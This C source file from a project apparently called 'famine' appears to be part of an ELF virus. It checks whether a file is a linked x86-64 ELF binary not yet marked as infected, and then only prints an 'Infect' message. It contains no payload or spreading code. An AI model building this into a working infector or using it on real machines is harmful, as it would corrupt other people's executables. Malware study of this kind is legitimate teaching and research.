#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline bool is_elf(const struct elf *file)
{
	if (file->ptr + ELF_MAGIC_SIZE >= file->ptr + file->size)
		return false;

	return *(unsigned int *)file->ptr == ELF_MAGIC_NUMBER;
}

static inline bool is_x86(const struct elf *file)
{
	Elf64_Ehdr const *header = (Elf64_Ehdr const *)file->ptr;

	if (file->ptr + sizeof(Elf64_Ehdr) >= file->ptr + file->size)
		return false;

	return header->e_ident[EI_CLASS] == X86_64;
}

static inline bool is_linked(const struct elf *file)
{
	Elf64_Ehdr const *header = (Elf64_Ehdr const *)file->ptr;

	if (file->ptr + sizeof(Elf64_Ehdr) >= file->ptr + file->size)
		return false;

	return header->e_entry != 0;
}

static inline bool is_not_infected(const struct elf *file)
{
	Elf64_Ehdr const *header = (Elf64_Ehdr const *)file->ptr;

	if (file->ptr + sizeof(Elf64_Ehdr) >= file->ptr + file->size)
		return false;

	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != PACK_MAGIC_NUMBER;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

const struct criteria sm[] =
{
	(const struct criteria){&is_elf},
	(const struct criteria){&is_x86},
	(const struct criteria){&is_linked},
	(const struct criteria){&is_not_infected},
};

void infect_file(const char *filename)
{
	struct elf file;
	const unsigned char limit = sizeof(sm) / sizeof(sm[0]);

	if ((file = get_file(filename)).size == 0)
		return ;

	for (unsigned char index = 0; index < limit; index++)
	{
		if (sm[index].f(&file) == false)
			return ;
	}

	printf("Infect \"%s\" -> %p\n", filename, file.ptr);

	_munmap(file.ptr, file.size);
}
